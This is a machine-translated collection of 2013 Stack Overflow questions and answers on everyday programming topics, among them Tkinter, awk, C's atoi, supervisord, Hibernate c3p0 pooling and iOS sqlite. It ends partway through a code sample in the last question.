> 时间：2013-02-13T05:55:41.920

条目的使用`-textvariable`选项：

```
eText = StringVar()
e = Entry(rootWin, width=60, state="readonly",textvariable=eText)
....
eText.set("...I'm not inserted, I've just appeared out of nothing.") 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-02-13T05:58:08.723

这似乎对我有用：

```
import Tkinter as tk

r = tk.Tk()

e = tk.Entry(r,width=60)
e.insert(0,'...')
e.configure(state='readonly')
e.grid(row=0,column=0)

r.mainloop() 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-02-13T12:03:18.417

解决方法很简单：暂时将状态设置为正常，插入文字，然后设置为禁用。

# sed - 哇 | 在字段匹配的基础上合并行

> ID：14847251
> 
> 赞同：3
> 
> 时间：2013-02-13T05:51:59.140
> 
> 标签：sed, awk

我需要以下帮助：

输入文件：

```
abc message=sent session:111,x,y,z
pqr message=receive session:111,4,5,7
abc message=sent session:123,x,y,z
pqr message=receive session:123,4,5,7
abc message=sent session:342,x,y,z
abc message=sent session:589,x,y,z
pqr message=receive session:589,4,5,7 
```

输出文件：

```
abc message=sent session:111,x,y,z, pqr message=receive session:111,4,5,7
abc message=sent session:123,x,y,z, pqr message=receive session:123,4,5,7
abc message=sent session:342,x,y,z, NOMATCH
abc message=sent session:589,x,y,z, pqr message=receive session:589,4,5,7 
```

笔记：

如果您在源文件中看到，对于每个“已发送”消息，“接收”
仅适用于 session=342 没有接收
会话是未知的，不能被硬编码
所以只合并那些发送和接收的我们有匹配的会话号

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:11:17.283

这是使用`awk`. 像这样运行：

```
awk -f script.awk file 
```

内容`script.awk`：

```
{
    x = $0

    gsub(/[^:]*:|,.*/,"")

    a[$0] = (a[$0] ? a[$0] "," FS : "") x
    b[$0]++
}

END {
    for (i in a) {
        print (b[i] == 2 ? a[i] : a[i] "," FS "NOMATCH") | "sort"
    }
} 
```

结果：

```
abc message=sent session:111,x,y,z, pqr message=receive session:111,4,5,7
abc message=sent session:123,x,y,z, pqr message=receive session:123,4,5,7
abc message=sent session:342,x,y,z, NOMATCH
abc message=sent session:589,x,y,z, pqr message=receive session:589,4,5,7 
```

或者，这是单线：

```
awk '{ x = $0; gsub(/[^:]*:|,.*/,""); a[$0] = (a[$0] ? a[$0] "," FS : "") x; b[$0]++ } END { for (i in a) print (b[i] == 2 ? a[i] : a[i] "," FS "NOMATCH") | "sort" }' file 
```

请注意，`sort`如果您不关心排序输出，则可以将管道放到。HTH。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:29:50.647

其他方式：

```
awk -F "[:,]"  '/=sent/{a[$2]=$0;}/=receive/{print a[$2], $0;delete a[$2];}END{for(i in a)print a[i],"NO MATCH";}' file 
```

结果：

```
abc message=sent session:111,x,y,z pqr message=receive session:111,4,5,7
abc message=sent session:123,x,y,z pqr message=receive session:123,4,5,7
abc message=sent session:589,x,y,z pqr message=receive session:589,4,5,7
abc message=sent session:342,x,y,z NO MATCH 
```

当`send`遇到记录时，它以会话 id 作为索引存储在数组中。当`receive`遇到记录时，`send`从数组中取出记录并与`receive`记录一起打印。此外，发送的记录会在收到记录时从数组中删除`receive`。在 END 处，数组中的所有剩余记录都打印为 NO MATCH。

# c - 我在 atoi() 中遇到了这条线，但不明白它做了什么

> ID：14847252
> 
> 赞同：0
> 
> 时间：2013-02-13T05:52:02.997
> 
> 标签：c, atoi

我有以下代码。

```
while (*str != '\0')
{
  digit = *str - '0';
  result = result * radix + digit;
  str++;
} 
```

这里是什么`*str -'0'`意思。？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T05:54:48.890

它将 ASCII 字符“0”到“9”分别转换为整数值 0 到 9。`*str`（显然，如果您确定它实际上是字符 '0' 到 '9' 之一，这只是一个好主意。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T07:28:38.043

这通过从当前字符`*str`中减去数字的编码值将字符值转换为整数。`'0'`整数的值将在 0 到 9 的范围内。

这是可行的，因为 C 保证数字 0 到 9 总是使用相邻值进行编码（即`'1'`保证 的编码值是精确`'0' + 1`的，等等）。

许多人似乎认为这以某种方式“利用”了 ASCII 的某些事实，但这必须适用于*任何*运行 C 的平台，无论系统的本机编码如何。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T06:05:00.570

*str 可能指向从 '0' 到 '9' 的字符值，但是，如果要对 *str 使用简单的算术，则可能无法按预期工作。如果 *str 指向字符 '4' 并且我们执行 '4' + 2 结果实际上是 54，因为 '4' 的 ASCII 值是 52。所以通过从 *str 中减去 '0' 我们将 ASCII 值转换为位数。'4' - '0' + 2 = 6

[http://www.asciitable.com/](http://www.asciitable.com/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T05:54:26.520

从 char 中减去零的 ascii 值，因此如果是数字，则将返回该位置的数值。

# java - Java EWS API - 确定原始邮件、回复邮件和转发邮件

> ID：14847260
> 
> 赞同：0
> 
> 时间：2013-02-13T05:52:33.227
> 
> 标签：java, exchangewebservices, ewsjavaapi

我正在开发一个与 MS Exchange 集成以接收用户请求的应用程序。作为此要求的一部分，我需要确保系统只处理原始电子邮件。如果用户回复已发送的电子邮件或再次将其转发到应用程序，我需要将它们作为重复项忽略。

我检查了 EWS API (EmailMessage) 文档，但没有看到任何可以为我提供该信息的内容。在搜索了一下后，我发现了一个 MAPI 属性“PR_LAST_VERB_EXECUTED”，它可能包含我正在寻找的信息，但没有遇到任何解释如何使用它或从 EmailMessage 接口派生它的示例代码。

我能看到的唯一其他选择是利用对话 ID 字段来检查收到的新电子邮件是否是现有对话的一部分。在这种情况下，认为它是重复的。

如果有人实现了类似的东西，请告诉我

# crystal-reports - 隐藏第一个记录的子报告

> ID：14847261
> 
> 赞同：0
> 
> 时间：2013-02-13T05:52:38.813
> 
> 标签：crystal-reports, subreport

在有一个主报告中，对于相同的名称，我们有两条记录，因为我们有两个与该查询相关的日期，我们得到两行。我有一个申请人的信息正在显示，我有一个子报告，它链接到主报告申请人姓名，因此每个申请人都显示它（以我想要的方式）。

但我只想显示同一申请人的第二行的子报告，而不是两行，因为子报告有申请人的简单详细信息，当它显示第一行和第二行的相同数据时，它看起来很模糊。

有什么办法可以实现吗？

```
Applicant     City     Date
 A            City1   2012/01/01
Subreport:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 A            City1   2011/01/01
Subreport:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

And I want display like:

Applicant     City     Date
 A            City1   2012/01/01
 A            City1   2011/01/01
Subreport:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:05:00.850

我现在所做的是，我在我的组下添加了一个运行总计字段，它为组内的每一行提供了记录号，你可以在这里看到如何做到这一点： [在每个组下设置记录号](http://vbcity.com/forums/t/76847.aspx)

现在我为包含子报告的部分设置抑制公式，例如

```
if RunningTotalField>1 then True 
```

这样，当我们在同一个组中有多个记录时，在我的情况下，我将只有一个申请人在组中（所以它在这里工作），然后它将隐藏第二个子报告。

# ubuntu - 主管未更新 PYTHONPATH 变量

> ID：14847262
> 
> 赞同：1
> 
> 时间：2013-02-13T05:52:40.923
> 
> 标签：ubuntu, pythonpath, supervisord

我有以下主管配置

```
[program:do_thing]
command = python -u stuff/do_thing.py
directory = /home/ubuntu/code/processing
environment = PYTHONPATH="$PYTHONPATH:/home/ubuntu/code/utils/"
stdout_logfile = /mnt/log/do_thing.log
redirect_stderr = true 
```

问题是`/home/ubuntu/code/utils/`没有根据 sys.path 包含在我的 PYTHONPATH 中（而且我无法从那里导入模块）。Sys.path 显示所有正确的路径，除了这个额外的路径。我已经尝试将它添加到我自己和 root 用户的 .bashrc 中，但他们没有被主管接收。

对于主管没有正确更新环境变量，我做错了什么？您需要更多信息吗？谢谢！

我也注意到了：在 ubuntu 用户中， sys.path 是 `['', '/home/ubuntu/code/processing', '/home/ubuntu/code/utils', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-linux2', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/pymodules/python2.7']`

当在主管内部调用时，它是： `['/home/ubuntu/code/processing/stuff', '/', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-linux2', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/pymodules/python2.7']`

请注意主管 sys.path 中如何有一个“/”条目？那个是从哪里来的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:02:18.107

完全从主管中删除流程并重新添加修复它（显然重读没有正确拉动更改？）

如果您有更好的解释，请发布。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-04-03T19:33:50.587

详细说明@ShaneReustle 的答案，我必须运行这些命令：

```
$ supervisorctl shutdown
$ supervisord 
```

# java - 用于具有多行支持的配置的最佳文件

> ID：14847268
> 
> 赞同：0
> 
> 时间：2013-02-13T05:52:53.523
> 
> 标签：java, properties

我有一个可由 .properties 文件配置的 java 程序。

但是其中一个配置键，我需要一个多行值。

例如：

```
#proerties file start
key1=value1
desc=a long long line /
next line/
and again next line with a very long desc
/(need to give some new line)
/
something else
from path D://myfile.txt 
```

现在你可以看到这是非常令人厌烦的，用户需要接受关于逃跑的教育。

所以我想知道有没有更好更优雅的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T08:04:50.717

是的，java 属性必须将多行文本转义为：

```
# The following is a multi-line description.
desc=Mi ne scias,\
    chu chi tio funkcias, chu ne.\
    Chu vi havas ideon? 
```

此外，可能需要对特殊字符进行 u 转义。

但是周围有一些属性编辑器。太多了，仅举一个。搜索具有多行功能、u 转义特殊字符、处理注释以及可能提供良好 i18n 支持（不同语言并排）的。

# javascript - Fancybox：创建指向一组图像的链接而不添加另一个图像？

> ID：14847273
> 
> 赞同：1
> 
> 时间：2013-02-13T05:53:22.827
> 
> 标签：javascript, jquery, html, fancybox

我有一组图像，如下所示：

```
<a class="fancybox-thumbs" data-fancybox-group="gym" href="DSC06334_650_480_c1.JPG">
<img width="650" height="480" alt="Golds Gym" src="DSC06334_650_480_c1.JPG">
</a>
<a class="fancybox-thumbs" data-fancybox-group="gym" href="10292010.jpg">
<img width="500" height="340" alt="Golds Gym" src="10292010.jpg">
</a> 
```

我正在尝试从外部链接链接到这些图像而不添加其他图像：

```
<a data-fancybox-group="gym" class="fancybox-thumbs">More images</a> 
```

问题是，当我这样做时，我最终会打开一个空白图像而不是画廊中的第一个图像，以及缩略图助手中的一个空图像：[example](http://d.pr/i/2kHN)。我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T09:40:31.167

我认为您在单击事件时打开了“fancybox-thumbs”上的fancybox，并且更多图像链接也具有相同的类，因此fancybox 将其视为添加空白图像拇指的图像。

请从“更多图片”链接中删除 class="fancybox-thumbs"，希望空白拇指问题能够解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-02T10:27:07.207

我的解决方案：

```
<a class="my-class" href="imgSrc-1-big.gif" rel="fancybox-gallery-1" >
  <img src="img_thumb-0-small.gif" alt="" />
</a>

<div style="display: none;"> 
  <a class="my-class" href="imgSrc-2-big.gif" rel="fancybox-gallery-1"></a>
  <a class="my-class" href="imgSrc-3-big.gif" rel="fancybox-gallery-1"></a>
  . . .
</div> 
```

# iphone - 带箭头的透明屏幕

> ID：14847274
> 
> 赞同：0
> 
> 时间：2013-02-13T05:53:29.920
> 
> 标签：iphone, ios, objective-c, cocoa-touch

我想做一个这样的屏幕并想在上面画箭头。并使事物可见。现在的问题是我不能使用全屏图像，因为该应用程序也适用于 iphone 和 ipad。我可以从 iphone 执行此任务吗？ ![图片](../Images/5ac0549d512bd17676052036094bbd02.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:04:25.970

```
UIImageView *imageView = [[UIImageView alloc] initWithImage:[UIImage imageWithName:@"your_image"]];
[imageView setAlpha = 0.5];  //or whatever alpha you want between 0 and 1
[imageView setFrame:CGRectMake(x,y,w,h)];
[self.view addSubview:imageView]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:45:22.267

你应该试试这个

1 在背景颜色上返回颜色 2 降低黑色的不透明度
3 它为您提供您想要的

# javascript - 正则表达式，而不是使用 num * num * num 格式的 split 函数

> ID：14847278
> 
> 赞同：0
> 
> 时间：2013-02-13T05:53:40.760
> 
> 标签：javascript, html, regex

我不想使用 split 函数，而是想使用格式为 num * num * num 的 eegular 表达式。

我想验证输入，以便用户只能以 2 * 3 * 4 的格式输入，即 anynumber * anynumber * anynumber。通过使用拆分功能，我成功​​地做到了这一点。有没有办法在 Javascript 中使用正则表达式来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:57:52.727

您希望它至少有一个数字，然后是任意数量（任意数量的空格、星号、任意数量的空格，然后是另一个数字）。尝试这个：

```
^\d+(\s*\*\s*\d)*$ 
```

是任意数量的`\d+`数字（不包括负数和小数，并以任意数量的零开头），`\s*`是零个或多个空白字符，并且`\*`是一个星号（前面有一个退格，因此不会混淆为“零或更多”） . 括号将末尾组合在一起，因此您可以在末尾添加任意数量的括号。您需要添加一个`^`and`$`以确保在开始和结束时不会忽略其他随机字符。

您可以使用正斜杠来表示 Javascript 中的正则表达式，因此：

```
var pattern = /^\d+(\s*\*\s*\d)*$/;
pattern.test("2 * 3 * 4");   // true
pattern.test("002  * 3* 04");   // true
pattern.test("2 # 3 # 4");   // false
pattern.test("2.0 * 3 * 4");   // false
pattern.test("-2 * 3 * 4");   // false 
```

如果您想要小数、负数、前导或尾随空格或任何其他类型的功能，则需要稍微调整模式……但希望这足以让您继续前进！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:00:01.807

您可以使用以下方式匹配模式：

此模式匹配单个数字（数字、星号、数字、星号、数字）

```
^\d\*\d\*\d$ 
```

此模式匹配任意长度的数字（数字、星号、数字、星号、数字）

```
^\d+\*\d+\*\d+$ 
```

您还可以使用 \s 标识符允许空格。以下允许数字和符号之间有一个空格：

```
^\d\s?\*\s?\d\s?\*\s?\d$ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T06:06:19.737

这将是您想要的：

```
^\d+\s*\*\s*\d+\s*\*\s*\d+$ 
```

它允许**integer*integer*integer**在 number 和 之间有零个或多个空格`*`。

要允许小数部分，请使用：

```
^\d+(\.\d+)?\s*\*\s*\d+(\.\d+)?\s*\*\s*\d+(\.\d+)?$ 
```

对于负数，添加`-?`以允许可选`-`，例如：

```
^-?\d+(\.\d+)?\s*\*\s*-?\d+(\.\d+)?\s*\*\s*-?\d+(\.\d+)?$ 
```

`^\s*-?\d+(\.\d+)?\s*\*\s*-?\d+(\.\d+)?\s*\*\s*-?\d+(\.\d+)?\s*$`在表达式前后允许零个或多个空格。要捕获数字，请使用捕获组：

为了`^\s*(-?\d+(\.\d+)?)\s*\*\s*(-?\d+(\.\d+)?)\s*\*\s*(-?\d+(\.\d+)?)\s*$`

`$1`,`$3`并`$5`分别给出 3 个数字。

如果不需要捕获并且您希望允许两个或更多因素，

```
-?\d+(\.\d+)?(\s*\*\s*-?\d+(\.\d+)?)+ 
```

会更好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T05:57:33.950

也许尝试：

```
document.write("2 * 3 * 4".match(/[0-9]+[\s]?\*[\s]?[0-9]+[\s]?\*[\s]?[0-9]+/)); 
```

# hibernate - 休眠 c3p0 连接 NewPooledConnection 关闭异常

> ID：14847279
> 
> 赞同：0
> 
> 时间：2013-02-13T05:53:57.200
> 
> 标签：hibernate, jboss, c3p0

我试图从我之前的帖子[java.sql.SQLRecoverableException: Closed Connection](https://stackoverflow.com/questions/14758223/java-sql-sqlrecoverableexception-closed-connection)中解决我的问题。我尝试使用 c3p0 连接。楼盘如下，

```
<property name="hibernate.connection.provider_class">
        org.hibernate.connection.C3P0ConnectionProvider</property>
    <property name="hibernate.connection.autoReconnect">true</property>
    <property name="dialect"> org.hibernate.dialect.Oracle10gDialect </property>
    <property name="hibernate.c3p0.min_size">5</property>
    <property name="hibernate.c3p0.max_size">20</property>
    <property name="hibernate.c3p0.timeout">300</property>
<property name="hibernate.c3p0.idle_test_period">6000</property>
    <property name="hibernate.c3p0.numHelperThreads">9</property> 
```

在 JBOSS 中部署后，我开始测试我的网络。一开始它工作得很好，甚至更快。10分钟后，它一直在加载并超时。通过 server.log 时，我收到了一些警告消息，如下所示。

```
00:34:13,162 INFO  [com.mchange.v2.c3p0.impl.NewPooledConnection] com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#2) [c3p0] Exceptions occurred while trying to close a PooledConnection's resources normally.
00:34:13,162 INFO  [com.mchange.v2.c3p0.impl.NewPooledConnection] (com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#2) [c3p0] NewPooledConnection close Exception.: java.sql.SQLRecoverableException: IO Error: Software  caused connection abort: recv failed
at oracle.jdbc.driver.T4CConnection.logoff(T4CConnection.java:556)   [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.PhysicalConnection.close(PhysicalConnection.java:3984) [ojdbc6.jar:11.2.0.3.0]
at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:474) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:191) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool$1PooledConnectionResourcePoolManager.destroyResource(C3P0PooledConnectionPool.java:470) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.resourcepool.BasicResourcePool$1DestroyResourceTask.run(BasicResourcePool.java:964) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread.run(ThreadPoolAsynchronousRunner.java:547) [c3p0-0.9.1.jar:0.9.1]
Caused by: java.net.SocketException: Software caused connection abort: recv failed
at java.net.SocketInputStream.socketRead0(Native Method) [rt.jar:1.6.0_13]
at java.net.SocketInputStream.read(SocketInputStream.java:129) [rt.jar:1.6.0_13]
at oracle.net.ns.Packet.receive(Packet.java:300) [ojdbc6.jar:11.2.0.3.0]
at oracle.net.ns.DataPacket.receive(DataPacket.java:106) [ojdbc6.jar:11.2.0.3.0]
at oracle.net.ns.NetInputStream.getNextPacket(NetInputStream.java:315) [ojdbc6.jar:11.2.0.3.0]
at oracle.net.ns.NetInputStream.read(NetInputStream.java:260) [ojdbc6.jar:11.2.0.3.0]
at oracle.net.ns.NetInputStream.read(NetInputStream.java:185) [ojdbc6.jar:11.2.0.3.0]
at oracle.net.ns.NetInputStream.read(NetInputStream.java:102) [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.T4CSocketInputStreamWrapper.readNextPacket(T4CSocketInputStreamWrapper.java:124) [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.T4CSocketInputStreamWrapper.read(T4CSocketInputStreamWrapper.java:80) [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.T4CMAREngine.unmarshalUB1(T4CMAREngine.java:1137) [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.T4CTTIfun.receive(T4CTTIfun.java:290) [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.T4CTTIfun.doRPC(T4CTTIfun.java:192) [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.T4C7Ocommoncall.doOLOGOFF(T4C7Ocommoncall.java:61) [ojdbc6.jar:11.2.0.3.0]
at oracle.jdbc.driver.T4CConnection.logoff(T4CConnection.java:543) [ojdbc6.jar:11.2.0.3.0]
... 6 more

00:34:13,177 WARN  [com.mchange.v2.resourcepool.BasicResourcePool] (com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread-#2) Failed to destroy resource: com.mchange.v2.c3p0.impl.NewPooledConnection@b041ecc: java.sql.SQLException: Some resources failed to close properly while closing com.mchange.v2.c3p0.impl.NewPooledConnection@b041ecc
at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:496) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:191) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool$1PooledConnectionResourcePoolManager.destroyResource(C3P0PooledConnectionPool.java:470) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.resourcepool.BasicResourcePool$1DestroyResourceTask.run(BasicResourcePool.java:964) [c3p0-0.9.1.jar:0.9.1]
at com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread.run(ThreadPoolAsynchronousRunner.java:547) [c3p0-0.9.1.jar:0.9.1] 
```

请给出一些想法来解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-14T06:27:22.817

这个问题有时会在会话关闭并且用于会话的连接仍然存在时引发，并且当再次打开一个新会话时会打开一个新会话。它导致连接池中指定的连接的使用超出了使用范围，并且辅助线程发挥了作用，我的问题就在这里。我更改了我的 Hibernate SessionFactory 类，并且自定义连接提供程序解决了我的问题。变化如下......

```
public class HibernateSessionFactory {
private staticString CONFIG_FILE_LOCATION = "/hibernate.cfg.xml";
private static Configuration configuration = new Configuration();
private static org.hibernate.SessionFactory sessionFactory;
private static String configFile = CONFIG_FILE_LOCATION;
public static Session session;
static {
    try {
        configuration.configure(configFile);
        sessionFactory = configuration.buildSessionFactory();
    } catch (Exception e) {
        System.err.println("%%%% Error Creating SessionFactory %%%%");
        e.printStackTrace();
    }
}

public HibernateSessionFactory() {
}
public static Session getSession() throws HibernateException {

    try {
        if (session == null) {
            session = sessionFactory.openSession(MyConnectionProvider
                    .getConn());
        } else {

            if (session.isOpen() && !session.connection().isClosed()) {

                System.out.println("SESSION AVAILABLE...");

                MyConnectionProvider.showConnectionDetails();

                return session;
            }

            if (!session.isOpen()) {
                System.out.println("SESSION WAS CLOSED AND OPEN AGAIN..");
                session = sessionFactory.openSession(MyConnectionProvider
                        .getConn());
            } else if (session.connection().isClosed()) {

                System.out.println("CONNECTION WAS CLOSED AND OPENING AGAIN...");

                session.close();

                session = sessionFactory.openSession(MyConnectionProvider
                        .getConn());
            }

        }
        MyConnectionProvider.showConnectionDetails();
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    return session;
}
public static org.hibernate.SessionFactory getSessionFactory() {
    return sessionFactory;
}
public static void setConfigFile(String configFile) {
    HibernateSessionFactory.configFile = configFile;
    sessionFactory = null;
}
public static Configuration getConfiguration() {
    return configuration;
}

} 
```

ang MyConnectionProvider 类是

```
public class MyConnectionProvider {

static String jdbcDriverClass;
static String jdbcUrl;
static String username;
static String password;
static String poolSize = "20";

static ComboPooledDataSource ds;

static {

    config(HibernateSessionFactory.getConfiguration().getProperties());

    ds = new ComboPooledDataSource();

    // System.out.println(" "+jdbcUrl);

    ds.setJdbcUrl(jdbcUrl);

    // System.out.println(username);

    ds.setUser(username);

    // System.out.println(password);

    ds.setPassword(password);

    ds.setMinPoolSize(1);

    ds.setMaxPoolSize(20);

}

public static void config(Properties props) {

    System.out.println("SETTING CONFIGURATION...");

    jdbcDriverClass = props.getProperty(Environment.DRIVER);
    jdbcUrl = props.getProperty(Environment.URL);
    username = props.getProperty(Environment.USER);
    password = props.getProperty(Environment.PASS);

    System.out.println(jdbcDriverClass + "  " + jdbcUrl + "  " + username
            + "  " + password + "  " + poolSize);
}

public static Connection getConn() {
    Connection conn = null;
    try {
        System.out.println("URL " + ds.getJdbcUrl());
        System.out.println("Busy Connections : "
                + ds.getNumBusyConnections("user", "user"));
        return ds.getConnection();
    } catch (SQLException e) {

        // TODO Auto-generated catch block
        e.printStackTrace();
        return conn;
    }
}

public static void showConnectionDetails() {

    try {
        System.out.println("Busy Connections :  "
                + ds.getNumBusyConnections() + " Connections : "
                + ds.getNumConnections() + " Thread Pool Size : "
                + ds.getThreadPoolSize() + " Active Threads : "
                + ds.getThreadPoolNumActiveThreads() + "  Idle Threads : "
                + ds.getThreadPoolNumIdleThreads() + "  Pending Tasks : "
                + ds.getThreadPoolNumTasksPending());
    } catch (SQLException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}

} 
```

# iphone - 当我从 sqlite 检索数据时，我没有收到这样的表错误？ 我为表和数据库提供了相同的名称。但是我没有找到这样的表错误。 sqlite3 *dbConnection = nil; NSArray *documentDirectory = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES); NSString *path = [docu 问问题 问问题 2013-02-13T05:54:18.407 158 次 This question shows research effort; it is useful and clear 0 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. 我为表和数据库提供了相同的名称。但是我没有找到这样的表错误。 sqlite3 *dbConnection = nil; NSArray *documentDirectory = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES); NSString *path = [documentDirectory objectAtIndex:0]; NSString *documentPath = [path stringByAppendingPathComponent:@"locations.sqlite"]; sqlite3_open([documentPath UTF8String], &dbConnection); sqlite3_stmt *statement = nil; @try { if(sqlite3_open([documentPath UTF8String], &dbConnection)!=SQLITE_OK) { sqlite3_close(dbConnection); } else { //create editable database copy } NSString *selectQuery=[[NSString alloc] initWithFormat:@"select * from address_locations"]; const char * retrieveQuery = [selectQuery UTF8String]; if(sqlite3_prepare_v2(dbConnection,retrieveQuery, -1, &statement, nil)==SQLITE_OK) { while (sqlite3_step(statement)==SQLITE_ROW) { NSMutableDictionary * dictionaryAboutInfo = [[NSMutableDictionary alloc]init]; [dictionaryAboutInfo setValue:[NSString stringWithFormat:@"%s",sqlite3_column_text(statement, 0)] forKey:@"ZIP"]; [dictionaryAboutInfo setValue:[NSString stringWithFormat:@"%s",sqlite3_column_text(statement, 1)] forKey:@"LATITUDE"]; [dictionaryAboutInfo setValue:[NSString stringWithFormat:@"%s",sqlite3_column_text(statement, 2)] forKey:@"LONGITUDE"]; ////NSLog(@"Retrived Dict values %@",dictionaryAboutInfo); [dealersInfoArray addObject:dictionaryAboutInfo]; [dictionaryAboutInfo release]; } } [selectQuery release]; } @catch (NSException *exception) { } @finally { sqlite3_finalize(statement); sqlite3_close(dbConnection); } 感谢提前 我认为您的数据库文件在捆绑包中，并且您正在从 documentDirectory.. 而不是从捆绑包中检索数据库！！！！ 您可以将路径更改为 NSString *documentPath = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"locations.sqlite"]; iphoneiosipadsqlite 4 2 回答 2 This answer is useful 0 BOOL success; NSFileManager *fileManager=[NSFileManager defaultManager]; success = [fileManager fileExistsAtPath:documentPath]; if (success) { NSLog(@"file found at the document path"); } //bundle path NSString *databasePathFromApp = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"address_locations.sqlite"]; [fileManager copyItemAtPath:databasePathFromApp toPath:documentPath error:nil]; sqlite3_open([documentPath UTF8String], &dbConnection); 于 2013-02-13T07:10:31.887 回答 This answer is useful 0 我认为您的数据库文件在捆绑中，您正在从 documentDirectory.. 中检索数据库，而不是从捆绑中检索数据库！！！！ 您可以将路径更改为 NSString *documentPath = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:@"locations.sqlite"]; 于 2013-02-13T06:28:28.837 回答 Related 2 mysql - SQL“检查可用性”语句 1 rest - 使用 Jersey 客户端调用基于 spring 的 REST api 0 android - Android - 第一个选项卡一开始没有加载 4 mysql - PHP - 注意：未定义的索引： 2 c - is shifting by more bits than are in a variable an undefined operation in c? 0 matlab - MATLAB 的 readobject 方法抛出 ClassNotFoundException 1 visual-studio-2010 - 第一次机会例外 2 python - Python：列表中出现次数最多的值 0 android - ImageView 捕捉位置点击 AlertDialog 1 csv - 将 Advantage Data Architect 中的 ADT(Advantage) 表转换为 CSV Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：14847284
> 
> 赞同：0
> 
> 时间：
> 
> 标签：iphone, ios, ipad, sqlite

我为表和数据库提供了相同的名称。但是我没有找到这样的表错误。

```
sqlite3 *dbConnection = nil;
NSArray *documentDirectory = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *path = [documentDirectory objectAtIndex:0];
NSString *documentPath = [path stringByAppendingPathComponent:@"locations.sqlite"];
sqlite3_open([documentPath UTF8String], &dbConnection);

sqlite3_stmt *statement = nil;

@try {
    if(sqlite3_open([documentPath UTF8String], &dbConnection)!=SQLITE_OK)
    {
        sqlite3_close(dbConnection);
    }
    else
    {

        //create editable database copy

    }
    NSString *selectQuery=[[NSString alloc] initWithFormat:@"select * from address_locations"];
    const char * retrieveQuery = [selectQuery UTF8String];

    if(sqlite3_prepare_v2(dbConnection,retrieveQuery, -1, &statement, nil)==SQLITE_OK)
    {
        while (sqlite3_step(statement)==SQLITE_ROW)
        {
            NSMutableDictionary * dictionaryAboutInfo = [[NSMutableDictionary alloc]init];
            [dictionaryAboutInfo setValue:[NSString stringWithFormat:@"%s",sqlite3_column_text(statement, 0)] forKey:@"ZIP"];
